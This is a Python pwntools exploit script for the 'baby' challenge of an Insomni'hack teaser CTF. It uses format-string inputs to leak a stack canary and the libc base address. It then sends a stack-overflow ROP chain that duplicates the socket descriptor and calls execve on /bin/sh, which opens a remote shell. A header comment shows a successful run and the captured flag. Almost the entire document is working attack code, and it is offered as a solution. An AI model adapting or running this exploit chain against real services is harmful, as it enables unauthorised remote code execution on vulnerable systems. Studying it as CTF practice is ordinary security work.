#!/usr/bin/python
'''
$ python a.py 
[+] Opening connection to baby.teaser.insomnihack.ch on port 1337: Done
Leaked cookie: 0x7971cd723454900
LIBC BASE: 0x7f129d29e000
[*] Switching to interactive mode
Good luck !
$ ls
baby
flag
$ cat flag
INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
$ 

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

Leak stack cookie and libc address through format string and pwn it using a stack overflow
'''
import sys
from pwn import *
import struct

rem = 1
libc = lambda x: struct.pack("<Q", LIBC_BASE + x)
ptr = lambda x: struct.pack("<Q",x)

s = remote("baby.teaser.insomnihack.ch",1337)
s.recvuntil("Your choice > ")

#leak cookie
s.send("2\n")
s.recvuntil("Your format > ")
s.send("%138$p\n")
cookie = int(s.recvline().rstrip(),16)
print "Leaked cookie: " + hex(cookie)

#leak libc
s.recvuntil("Your format > ")
s.send("%158$p\n")
s.send("\n")
LIBC_START_MAIN = int(s.recvline().rstrip(),16)

if(rem):
    LIBC_BASE = (LIBC_START_MAIN-240) - 0x0000000000020740
else:
    LIBC_BASE = (LIBC_START_MAIN-245) - 0x0000000000021a50

if(rem):
    BINSH = 0x000000000018C177
    #0x00000000001144d9 : pop rdx ; pop rsi ; ret
    POP_RDX_RSI = 0x00000000001144d9
    #0x0000000000021102 : pop rdi ; ret
    POP_RDI = 0x0000000000021102
    #00000000000cbbc0  w   DF .text0000000000000021  GLIBC_2.2.5 execve
    EXECVE = 0x00000000000cbbc0
    #00000000000f6d90  w   DF .text0000000000000021  GLIBC_2.2.5 dup2
    DUP2 = 0x00000000000f6d90
    #0x00000000000202e8 : pop rsi ; ret
    POP_RSI = 0x00000000000202e8
else:
    BINSH = 0x00000000001633E8
    # 0x00000000000f4bd9 : pop rdx ; pop rsi ; ret
    POP_RDX_RSI = 0x00000000000f4bd9
    #0x0000000000022482 : pop rdi ; ret
    POP_RDI =  0x0000000000022482
    #execve
    EXECVE = 0x00000000000ba310
    #00000000000dc240  w   DF .text0000000000000021  GLIBC_2.2.5 dup2
    DUP2 = 0x00000000000dc240
    #0x0000000000024125 : pop rsi ; ret
    POP_RSI = 0x0000000000024125

print "LIBC BASE: " + hex(LIBC_BASE)

s.recvuntil("Your choice >")
s.send("1\n")
s.recvuntil("How much bytes you want to send ? ")

buf = "A" * 1032
buf += ptr(cookie)
buf += ptr(0)
buf += libc(POP_RDI) + ptr(4) + libc(POP_RSI) + ptr(0) + libc(DUP2)
buf += libc(POP_RDI) + ptr(4) + libc(POP_RSI) + ptr(1) + libc(DUP2)
buf += libc(POP_RDX_RSI) + (ptr(0) * 2) + libc(POP_RDI) + libc(BINSH) + libc(EXECVE)

#len
s.send(str(len(buf))+"\n")
s.send(buf + "\n")

#shell
s.interactive()

